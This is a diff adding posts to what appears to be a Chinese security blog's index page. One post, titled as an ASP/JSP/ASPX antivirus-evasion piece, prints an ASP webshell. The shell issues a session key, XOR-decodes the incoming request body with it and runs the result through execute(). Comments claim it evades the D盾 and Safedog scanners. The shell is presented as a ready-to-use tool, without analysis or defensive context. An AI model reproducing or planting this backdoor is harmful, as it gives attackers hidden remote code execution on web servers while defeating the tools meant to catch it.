@@ -152,6 +152,118 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-jsp asp aspx免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="jsp-asp-aspx免杀"><a href="#jsp-asp-aspx免杀" class="headerlink" title="jsp asp aspx免杀"></a>jsp asp aspx免杀</h1><h2 id="1："><a href="#1：" class="headerlink" title="1："></a>1：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#websafe知识星球</span><br><span class="line">&lt;%</span><br><span class="line">Response.CharSet &#x3D; &quot;UTF-8&quot; </span><br><span class="line">If Request.ServerVariables(&quot;REQUEST_METHOD&quot;)&#x3D;&quot;GET&quot; And Request.QueryString(&quot;pass&quot;) Then</span><br><span class="line">For a&#x3D;1 To 8</span><br><span class="line">RANDOMIZE</span><br><span class="line">k&#x3D;Hex((255-17)*rnd+16)+k</span><br><span class="line">Next</span><br><span class="line">Session(&quot;k&quot;)&#x3D;k</span><br><span class="line">response.write(k)</span><br><span class="line">Else</span><br><span class="line">k&#x3D;Session(&quot;k&quot;)</span><br><span class="line">size&#x3D;Request.TotalBytes</span><br><span class="line">content&#x3D;Request.BinaryRead(size)</span><br><span class="line">For i&#x3D;1 To size</span><br><span class="line">t&#x3D;t&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))</span><br><span class="line">Next</span><br><span class="line">execute(t)</span><br><span class="line">End If</span><br><span class="line">%&gt;</span><br><span class="line">#免杀D盾安全狗</span><br><span class="line">#连接正常，无法执行命令列目录</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2021/03/06/jsp%20asp%20aspx%E5%85%8D%E6%9D%80/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/06/jsp%20asp%20aspx%E5%85%8D%E6%9D%80/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-demo1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/06/demo1/">demo1</a>
+    </h1>
+  
+
+        
+        <a href="/2021/03/06/demo1/" class="archive-article-date">
+  	<time datetime="2021-03-06T08:13:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/06/demo1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
